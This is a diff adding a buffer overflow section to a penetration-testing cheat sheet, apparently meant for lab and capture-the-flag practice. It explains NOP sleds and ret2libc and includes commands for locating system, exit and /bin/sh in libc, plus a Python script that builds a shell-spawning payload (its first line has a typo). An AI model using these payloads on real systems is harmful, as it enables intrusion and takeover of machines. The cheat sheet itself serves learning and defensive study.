@@ -34,6 +34,7 @@
 33. [Local File Inclusion](#Local-File-Inclusion)
 34. [Log Poisoning](#Log-Poisoning)
 35. [SNMP](#SNMP)
+36. [Buffer Overflow](#Buffer-Overflow)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -1598,4 +1599,90 @@ data
 snmpwalk
 snmpwalk -c public -v2c 10.10.10.116
 snmp-check
+```
+
+# Buffer Overflow
+* check if you can write executable code in the stack with peda: ``checksec``. 
+* alternatively you have to do it manually or use a script: https://github.com/slimm609/checksec.sh/blob/master/README.md
+* if NX is enabled writing shellcode into buffer will not execute
+
+## Concept
+```
+     STACK
+
+________________
+|   Function   |
+----------------
+|     Data     |
+----------------
+|Return Address|
+----------------
+|Base Pointers |
+----------------
+|      ^       |
+|      |       |
+|              |
+|    Buffer    |
+|              |
+|              |
+________________
+```
+* try to exceed buffer and overwrite base pointers and return address
+* craft buffer according to the following concept 
+
+```bash
+python -c 'print "\x90" * 470 + "<shellcode>" + "<memory address in middle of NOPs>" 
+```
+* \x90 is a NOP and works like a sled since it gets skipped
+* therefore run the binary and check $esp for NOP's
+* choose address in middle and paste it as 'memory address in middle of NOPs'
+* in the example the offset is 500
+* $eip gets overwritten with memory address in middle of NOP's
+* NOP's get hit 
+* instructions follow until shellcode is hit and executes
+
+## ret2libc
+* you need the libc address as kind of a 'base'
+* afterwards the stack frame dictates the order the function call and parameters are written
+* see this [link](https://newbedev.com/why-must-a-ret2libc-attack-follow-the-order-system-exit-command) (explains it much better)
+```
+function_address
+return_address
+parameters
+```
+* so either try to provide some junk for parameters so the function may return to your payload
+* or provide actual exit address and payload as parameter for system()
+
+1. find the libc address 
+```bash
+ldd <binary>
+```
+2. find the system() address
+```bash
+locate libc.so.6
+readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+```
+3. find the exit() address
+```bash
+locate libc.so.6
+readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
+```
+4. find /bin/sh in libc
+```bash
+strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+```
+5. create simple python script to print payload
+```python
+mport struct
+
+junk = "A" * 52
+
+libc_addr = 0xf7d79000
+sh_addr = struct.pack('<I', libc_addr + 0x0015ba0b)
+system_addr = struct.pack('<I', libc_addr + 0x0003ada0)
+exit_addr = struct.pack('<I', libc_addr + 0x0002e9d0)
+
+payload = junk + system_addr + exit_addr + sh_addr
+
+print payload
 ```
